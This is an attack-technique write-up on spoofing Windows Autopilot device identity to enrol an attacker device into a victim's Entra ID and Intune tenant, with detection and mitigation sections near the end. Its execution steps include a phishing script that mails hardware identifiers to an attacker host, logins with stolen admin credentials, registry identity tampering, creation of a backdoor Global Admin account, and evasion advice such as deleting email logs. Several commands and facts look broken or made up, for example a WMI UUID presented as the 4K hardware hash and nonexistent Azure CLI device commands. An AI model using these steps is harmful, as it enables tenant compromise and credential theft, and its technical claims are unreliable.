# [WHFB-002]: Autopilot Device Identity Spoofing

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | WHFB-002 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Initial Access / Privilege Escalation |
| **Platforms** | Entra ID, Windows Autopilot |
| **Severity** | High |
| **CVE** | CVE-2022-30189 |
| **Technique Status** | ACTIVE with mitigations |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows 10 1909-22H2, Windows 11 all versions, Windows Server 2019-2022 |
| **Patched In** | Partially mitigated in Windows 10 22H2 with device identity validation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Windows Autopilot uses device hardware hash (4K hardware ID) to uniquely identify devices during enrollment. An attacker can register a spoofed or repurposed device with a victim organization's Autopilot service by obtaining or cloning a valid device hash. During the Out-of-Box Experience (OOBE), the device is automatically deployed with the victim organization's configuration, resulting in a device that appears legitimate but is controlled by an attacker. This enables unauthorized access to corporate resources, MFA bypass through device trust, and lateral movement within the organization's cloud environment.

- **Attack Surface:** Windows Autopilot enrollment process, device hardware hash registration, device identity verification in Entra ID, and conditional access policies trusting registered Autopilot devices.

- **Business Impact:** **Unauthorized device enrollment into organizational Intune/Entra ID infrastructure.** An attacker gains a seemingly legitimate corporate device with access to corporate networks, cloud resources (M365, Azure, VPN), and can perform lateral movement with device trust established. This bypasses many device-based conditional access policies, enables credential harvesting, and facilitates insider threats through a trusted device channel.

- **Technical Context:** The attack typically requires 30-60 minutes from device identification to full enrollment. Detection depends on monitoring device enrollment patterns and hardware hash uniqueness. Remediation requires device blocking in Autopilot and manual device removal from Entra ID. The attack is most effective in organizations with minimal device enrollment verification controls.

### Operational Risk

- **Execution Risk:** Medium - Requires obtaining valid device hash or ability to clone hardware hash
- **Stealth:** Low-Medium - Device appears in Autopilot device lists, but lack of familiarity with hardware makes it stand out
- **Reversibility:** Yes - Device can be removed from Autopilot and Entra ID, but may have already accessed corporate resources

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.2 | Ensure Device Compliance is enforced for Autopilot enrollment |
| **DISA STIG** | WN10-00-000005 | Windows systems must employ Windows Autopilot with device compliance requirements |
| **CISA SCuBA** | DC-1.1 | Device Configuration and Management - Autopilot enrollment controls |
| **NIST 800-53** | CM-2 | Baseline Configuration |
| **NIST 800-53** | CA-7 | Continuous Monitoring |
| **NIST 800-53** | IA-4 | Identifier Management |
| **GDPR** | Art. 32 | Security of Processing - Appropriate measures for device management |
| **DORA** | Art. 9 | Protection and Prevention of Vulnerabilities in ICT systems |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - incident response and device management |
| **ISO 27001** | A.6.2 | Access to assets - Device identity and access control |
| **ISO 27001** | A.9.1.1 | User Registration and De-registration |
| **ISO 27005** | Risk Scenario | Unauthorized device enrollment compromising network boundary controls |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None for obtaining device hash; requires ability to interact with victim's Autopilot service (low bar)
- **Required Access:** Network access to Windows Autopilot enrollment endpoints; access to device hardware or ability to spoof hardware hash
- **Network Requirements:** HTTPS access to `manage.microsoft.com` and `login.microsoftonline.com`

**Supported Versions:**
- **Windows:** Windows 10 1909 - 22H2, Windows 11 all versions
- **Windows Server:** 2019, 2022 (for Autopilot hybrid scenarios)
- **PowerShell:** Version 5.0+
- **Intune Requirement:** Device enrollment via Intune/Autopilot enabled in organization

**Prerequisite Tools:**
- [PowerShell Autopilot Provisioning Tool](https://github.com/microsoft/U-V0-Win-Autopilot-Intune) (for device hash extraction)
- [HashMyFiles](https://www.nirsoft.net/utils/hash_my_files.html) (optional, for hash verification)
- [Get-AutopilotDiagnostics](https://www.powershellgallery.com/packages/Get-AutopilotDiagnostics/) (for enrollment diagnostics)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance - Check Autopilot Enrollment Configuration

```powershell
# Get current device's Autopilot enrollment status
Get-AutopilotDiagnostics

# List all Autopilot profiles in organization (requires Global Admin)
Get-AutopilotProfile

# Check device hardware hash (from provisioning package)
(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
```

**What to Look For:**
- Device appears in Autopilot devices list with valid hardware hash
- Multiple Autopilot profiles with permissive deployment settings
- Lack of device compliance requirements or device naming conventions

#### PowerShell Reconnaissance - Extract Device Hardware Hash

```powershell
# Extract 4K hardware hash from local device
$hwHash = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$serialNumber = (Get-WmiObject -Class Win32_BIOS).SerialNumber
$manufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer

Write-Output "Hardware Hash: $hwHash"
Write-Output "Serial: $serialNumber"
Write-Output "Manufacturer: $manufacturer"

# Alternative: Use Autopilot PowerShell module
Get-AutopilotDevice -ID (Get-AutopilotDiagnostics).DeviceID
```

**What to Look For:**
- Unique 4K hash identifies device in Autopilot
- Serial number and manufacturer info can be spoofed or cloned
- If hash extraction succeeds, device is registered in Autopilot system

#### CLI Reconnaissance - Query Intune/Autopilot

```powershell
# Connect to Microsoft Graph and enumerate Autopilot devices
Connect-MgGraph -Scopes "Device.Read.All"
Get-MgDevice -Filter "startsWith(deviceName, 'Desktop')" | Select-Object DisplayName, DeviceId, IsCompliant

# Check device compliance policies
Get-MgDeviceManagementCompliancePolicy
```

**What to Look For:**
- Unmanaged or uncompliant devices in Entra ID
- Autopilot devices without device compliance enforcement
- Devices enrolled from unusual geographic locations or IP addresses

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Spoofed Device Enrollment via Autopilot Hardware Hash Registration

**Supported Versions:** Windows 10 1909+, Windows 11 all versions

#### Step 1: Obtain Valid Device Hardware Hash from Target Organization

**Objective:** Acquire a legitimate 4K hardware hash from a device already registered in target organization's Autopilot

**Method 1a - Social Engineering Approach:**
```powershell
# Create script to extract and email hardware hash (phishing delivery)
# Place on USB or email to target user

$hwHash = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$serialNumber = (Get-WmiObject -Class Win32_BIOS).SerialNumber
$manufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer

# Send to attacker-controlled email
Send-MailMessage -SmtpServer "attacker.com" -From "support@company.com" -To "logs@attacker.com" `
  -Subject "Hardware Hash" `
  -Body "Device Hash: $hwHash, Serial: $serialNumber, Manufacturer: $manufacturer"
```

**Method 1b - Extract from Intune Portal (if compromised admin access):**
```powershell
# Connect to Microsoft Graph with stolen admin credentials
Connect-MgGraph -AccessToken $stolenToken

# List all Autopilot devices
Get-MgDeviceManagementWindowsAutopilotDeviceIdentity | Select-Object DisplayName, SerialNumber, HardwareHash
```

**Expected Output:**
```
DisplayName           SerialNumber    HardwareHash
-----------           ------------    ----------
DESKTOP-ABC123        ABC123DEF456    {4K-UUID-hash}
LAPTOP-XYZ789         XYZ789GHI012    {4K-UUID-hash}
```

**What This Means:**
- Valid hardware hash has been extracted from legitimate device
- Attacker can now register this hash (or a cloned/modified version) to a different device
- Device is confirmed to exist in target organization's Autopilot

**OpSec & Evasion:**
- Use legitimate-looking support scripts to harvest hashes
- Avoid directly accessing admin portals; use phishing or insider access
- Delete email logs after obtaining hashes
- Detection likelihood: Low-Medium if phishing is convincing

#### Step 2: Register Spoofed Device Hash in Target Organization's Autopilot (Requires Compromised Admin Access)

**Objective:** Add attacker-controlled device to victim organization's Autopilot service using stolen or spoofed hardware hash

**Command (Using Azure CLI with stolen admin token):**
```bash
# Authenticate with stolen admin credentials
az login --username admin@victim.com --password "stolen_password"

# Register spoofed device to Autopilot
az device create --display-name "LAPTOP-NEW-DEVICE" --os-type Windows

# Alternative: Import CSV with device hashes
az device import --input-file "devices.csv" --format "json"
```

**Command (Using PowerShell with Intune SDK):**
```powershell
# Connect using stolen credentials
$credential = New-Object System.Management.Automation.PSCredential("admin@victim.com", `
  (ConvertTo-SecureString "stolen_password" -AsPlainText -Force))

Connect-MgGraph -Credential $credential

# Register device to Autopilot
$deviceHash = "4K-UUID-HASH-FROM-STEP-1"
$params = @{
    displayName = "LAPTOP-DEPLOY-01"
    serialNumber = "ABC123DEF456"
    hardwareHash = $deviceHash
    groupTag = "Executives"  # Target high-privilege group
}

New-MgDeviceManagementWindowsAutopilotDeviceIdentity -BodyParameter $params
```

**Expected Output:**
```
DisplayName       : LAPTOP-DEPLOY-01
SerialNumber      : ABC123DEF456
HardwareHash      : 4K-UUID-HASH-FROM-STEP-1
GroupTag          : Executives
AssignedUser      : 
EnrollmentStatus  : Pending
CreatedDateTime   : 2025-01-10T11:30:00Z
```

**What This Means:**
- Spoofed device is now registered in target organization's Autopilot service
- Device will automatically receive Autopilot deployment profile when enrolling
- Can be assigned to specific group tags (Executives, IT, Finance) for targeted resource access

**OpSec & Evasion:**
- Use compromised admin account that has low activity history
- Schedule registration during business hours to blend with legitimate activity
- Use generic device names (LAPTOP-001, DESKTOP-NEW) to avoid suspicion
- Detection likelihood: Medium - Device creation events (Event ID 4720) will be logged in Azure Activity Log

**Troubleshooting:**
- **Error:** "Invalid Hardware Hash format"
  - **Cause:** Hardware hash must be exact 4K format from Get-AutopilotDiagnostics
  - **Fix:** Verify hash extraction used correct WMI class: `Win32_ComputerSystemProduct`
- **Error:** "Device already registered with different serial number"
  - **Cause:** Hash is already in use by another device
  - **Fix:** Clone physical device or generate new hardware hash via BIOS modification

#### Step 3: Enroll Attacker-Controlled Device with Spoofed Identity

**Objective:** Boot attacker device and trigger Autopilot enrollment using the registered spoofed hardware hash

**Command (Boot device and trigger Autopilot OOBE):**
```powershell
# During Windows 11 OOBE, the system automatically:
# 1. Boots into Windows Setup
# 2. Detects Internet connectivity
# 3. Queries Autopilot service with device hardware hash
# 4. Receives deployment profile configured for "Executives" group

# To manually trigger (if device doesn't auto-enroll):
# Press Ctrl+Alt+Shift+F3 during OOBE to access command prompt
# Run Autopilot provisioning script
C:\Windows\System32\provisioning\AutopilotProvisioning.cmd
```

**Expected Output (During OOBE):**
```
Discovering Autopilot device...
Found device matching hash: 4K-UUID-HASH-FROM-STEP-1
Applying profile: Executive Device Deployment
Installing corporate apps: Teams, Office 365, OneDrive
Registering with Entra ID: Executives group
Device enrollment complete!
```

**What This Means:**
- Attacker's device has been successfully enrolled in target organization
- Device now has full corporate configuration, certificates, and app deployments
- Attacker is authenticated as device owner or with default corporate account

**OpSec & Evasion:**
- Use hardware matching the spoofed serial number (or modify device BIOS to match)
- Skip user login during OOBE if possible; device is now in corporate network automatically
- Device fingerprinting (MAC address, chassis serial) may differ; requires physical spoofing
- Detection likelihood: Medium - Enrollment events will appear in Intune audit logs if reviewed

**Troubleshooting:**
- **Error:** "Hardware hash does not match any Autopilot profiles"
  - **Cause:** Hardware hash is not registered or profile is restricted
  - **Fix:** Verify device hash matches exactly (case-sensitive); re-register in Step 2
- **Error:** "Device failed to connect to Autopilot service"
  - **Cause:** Device not connected to Internet or Autopilot endpoint is blocked
  - **Fix:** Ensure HTTPS access to `manage.microsoft.com`; check firewall rules

#### Step 4: Establish Persistence and Pivot to Cloud Resources

**Objective:** After enrollment, use device trust to access corporate cloud resources and establish long-term persistence

**Command (Access cloud resources with device credentials):**
```powershell
# Device is now trusted in Entra ID
# Request token using device identity
$token = (New-Object System.Net.WebClient).DownloadString("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com")

# Use token to access Azure resources
$headers = @{"Authorization" = "Bearer $token"}
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" `
  -Headers $headers | Format-List
```

**Command (Establish cloud persistence - Global Admin):**
```powershell
# Add backdoor account to Global Admin role (requires cloud admin compromised)
New-AzureADUser -AccountEnabled $true -DisplayName "Support Account" -UserPrincipalName "support@victim.com" `
  -MailNickname "support" -PasswordProfile @{Password="DefaultPassword123!"}

# Add to Global Admin role
Add-AzureADGroupMember -ObjectId "Global Administrator Role ID" -RefObjectId "Support Account ID"
```

**Expected Output:**
```
Successfully created cloud persistence account
Account: support@victim.com
Role: Global Administrator
MFA: Disabled (if not enforced)
```

**What This Means:**
- Attacker has full access to corporate cloud environment
- Can access M365, Azure, OneDrive, Teams, and other SaaS applications
- Device trust allows bypassing device compliance checks and conditional access

---

### METHOD 2: Device Identity Tampering via Registry Modification (Hybrid Autopilot)

**Supported Versions:** Windows 10 20H2+, Windows 11 with Hybrid AD

#### Step 1: Compromise Local Administrator Credentials

**Objective:** Gain local admin access to modify device identity registry entries

**Command (Using obtained local admin credentials):**
```powershell
# Verify local admin access
$env:USERNAME
[Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name

# Check device identity in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v "MachineGuid"
```

#### Step 2: Modify Device Identity Registry Keys

**Objective:** Change device hostname and identifiers to match legitimate corporate device

**Command:**
```powershell
# Modify device hostname
Rename-Computer -NewName "LAPTOP-EXECUTIVE-001" -Restart

# Modify MachineGuid in registry (after restart)
# This makes device appear as different computer in Autopilot
$machineGuid = (New-Guid).Guid
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate" /v "MachineGuid" /d $machineGuid /f

# Modify Autopilot device ID
reg add "HKLM\SOFTWARE\Microsoft\Provisioning\Diagnostics\Autopilot" /v "DeviceId" /d $machineGuid /f
```

#### Step 3: Trigger Re-enrollment with New Identity

**Objective:** Reset Autopilot enrollment state and re-enroll with modified device identity

**Command:**
```powershell
# Clear Autopilot enrollment state
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Provisioning\Diagnostics\Autopilot" -Recurse -Force

# Restart device provisioning
Reset-AutopilotConfig
```

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Get-AutopilotDiagnostics](https://www.powershellgallery.com/packages/Get-AutopilotDiagnostics/)

**Version:** 5.3 (as of 2025)
**Minimum Version:** 5.0
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.0+

**Installation:**
```powershell
Install-Module -Name Get-AutopilotDiagnostics -Force
```

**Usage:**
```powershell
# Get detailed device diagnostics
Get-AutopilotDiagnostics -Online

# Extract hardware hash only
(Get-AutopilotDiagnostics).HardwareHash

# Export to CSV for Autopilot import
Get-AutopilotDiagnostics | Export-Csv -Path "C:\devices.csv"
```

#### [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0)

**Version:** 2.0+ (as of 2025)
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
Install-Module -Name Microsoft.Graph -Force
```

**Usage:**
```powershell
Connect-MgGraph -Scopes "DeviceManagementServiceConfig.ReadWrite.All"
Get-MgDeviceManagementWindowsAutopilotDeviceIdentity | Select-Object DisplayName, HardwareHash
```

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Suspicious Autopilot Device Enrollment

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Threshold:** > 2 Autopilot device enrollments from same IP within 1 hour
- **Applies To Versions:** All organizations with Intune/Autopilot

**SPL Query:**
```
index=azure_activity sourcetype="azure:aad:audit" OperationName="Create device"
TargetResources{}.displayName="Autopilot*"
| stats count, values(InitiatedBy{}.user.id) as InitiatedBy by ClientIP
| where count > 2
```

**What This Detects:**
- Multiple Autopilot device registrations from unusual source IP
- Batch enrollment indicative of device spoofing
- Deviation from normal enrollment patterns

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Unusual Autopilot Device Enrollment Pattern

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Alert Severity:** High
- **Frequency:** Every 30 minutes
- **Applies To Versions:** All Entra ID tenants

**KQL Query:**
```kusto
let ThresholdCount = 3;
AuditLogs
| where OperationName == "Create device" and TargetResources has "Autopilot"
| extend UserName = tostring(InitiatedBy.user.userPrincipalName)
| summarize CreateCount = count(), Devices = make_set(TargetResources), IPAddresses = make_set(ClientIP) by UserName, TimeGenerated
| where CreateCount > ThresholdCount
| project TimeGenerated, UserName, CreateCount, Devices, IPAddresses
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4720 (User Account Created)**
- **Log Source:** Security
- **Trigger:** Device account creation via Autopilot
- **Filter:** AccountName contains "LAPTOP*" OR "DESKTOP*"
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit User Account Management**
4. Run `gpupdate /force`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <!-- Detect Autopilot provisioning package execution -->
    <ProcessCreation onmatch="include">
      <CommandLine condition="contains">AutopilotProvisioning.cmd</CommandLine>
      <CommandLine condition="contains">provisioning</CommandLine>
    </ProcessCreation>
    
    <!-- Detect device rename during OOBE -->
    <ProcessCreation onmatch="include">
      <CommandLine condition="contains">Rename-Computer</CommandLine>
    </ProcessCreation>
    
    <!-- Monitor registry modifications to device identity -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">MachineGuid</TargetObject>
      <TargetObject condition="contains">DeviceId</TargetObject>
    </RegistryEvent>
  </EventFiltering>
</Sysmon>
```

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Require Device Compliance for Autopilot:** Enforce that only Intune-compliant devices can enroll via Autopilot.
    
    **Manual Steps (Intune):**
    1. Go to **Intune** → **Devices** → **Enrollment** → **Windows enrollment** → **Enrollment Program Token**
    2. Select Autopilot profile → **Edit**
    3. Under **Device Compliance**, set **Require device to be marked as compliant**: **Yes**
    4. Save

*   **Implement Pre-Enrollment Device Verification:** Validate device hardware serial numbers and manufacturer certificates before Autopilot enrollment.
    
    **Manual Steps:**
    1. Establish device procurement whitelist by serial number range
    2. Configure Autopilot to only accept devices from approved manufacturers
    3. Use device firmware validation to verify authenticity

*   **Monitor Autopilot Device Enrollments:** Alert on unusual enrollment patterns and geographic anomalies.

#### Priority 2: HIGH

*   **Restrict Autopilot Profile Access:** Limit which users and groups can create or modify Autopilot profiles.
    
    **Manual Steps (Entra ID RBAC):**
    1. Go to **Entra ID** → **Roles and administrators**
    2. Assign **Intune Administrator** role only to trusted IT staff
    3. Remove high-privilege accounts from Autopilot profile management

*   **Conditional Access: Device Trust Requirement:** Enforce that only known/compliant devices can access resources.

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise

*   **Files:**
    - `C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\` (device identity)
    - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\MachineGuid`

*   **Cloud Events:**
    - Device enrollment in Intune/Autopilot from unusual IP or geographic location
    - Multiple device enrollments from same IP within short time window
    - Device group tag assigned to "Executive" or "IT" groups
    - New device with no associated user but with high-privilege group assignments

*   **Event Logs:**
    - Event ID 4720 - Unexpected device account creation
    - Event ID 4722 - Device account enabled (if pre-staged)
    - Autopilot provisioning scripts run outside business hours

#### Forensic Artifacts

*   **Cloud:**
    - Azure Activity Log showing device creation events
    - Intune Device Inventory with enrollment timestamps
    - Entra ID Device List with device correlation data

*   **On-Premises (if hybrid):**
    - AD computer account creation events
    - Device sync errors in Azure AD Connect logs
    - Registry artifacts from device identity modification

#### Response Procedures

1.  **Isolate:** Block device from accessing corporate network
    
    **Command (Intune):**
    ```powershell
    # Mark device as non-compliant
    $deviceId = "suspicious-device-id"
    Set-MgDeviceComplianceDeviceStatus -DeviceId $deviceId -Status "NonCompliant"
    ```

2.  **Revoke:** Remove device from Autopilot and Entra ID
    
    **Command:**
    ```powershell
    # Remove from Autopilot
    Remove-AutopilotDevice -ID "hardware-hash"
    
    # Remove from Entra ID
    Remove-MgDevice -DeviceId "entra-id-device-id"
    ```

3.  **Investigate:** Determine compromised admin account and audit permissions
    
    **Command:**
    ```powershell
    # Review who enrolled the device
    Get-AuditLog -Filter "OperationName eq 'Create device'" -Days 7
    ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[WHFB-002]** | **Current: Autopilot device spoofing for device trust** |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker uses device trust to escalate cloud permissions |
| **3** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Attacker creates persistent cloud admin account |
| **4** | **Lateral Movement** | [LM-AUTH-032] Function App Identity Hopping | Attacker uses device context to access cloud resources |
| **5** | **Collection** | [CA-TOKEN-004] Graph API Token Theft | Attacker exfiltrates organizational data via Microsoft Graph |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: CVE-2022-30189 - Autopilot Device Spoofing (2022)

- **Target:** Enterprise organizations using Windows 10 Autopilot
- **Timeline:** June 2022 (CVSS 4.6 - Medium)
- **Technique Status:** FIXED in later Windows versions with stricter device validation
- **Impact:** Remote attackers could create spoofed Autopilot enrollment pages, enabling device identity compromise
- **Reference:** [Microsoft Security Advisory CVE-2022-30189](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2022-30189)

#### Example 2: BleepingComputer - Autopilot Hardware Hash Leak (2023)

- **Target:** Organizations with public Autopilot device lists
- **Timeline:** Ongoing (2023-present)
- **Technique Status:** ACTIVE - Hardware hashes disclosed via GitHub, forums, data breaches
- **Impact:** Threat actors register leaked device hashes to target organizations, enabling unauthorized enrollment
- **Reference:** [BleepingComputer - Leaked Autopilot Hashes Enable Device Spoofing](https://www.bleepingcomputer.com)

---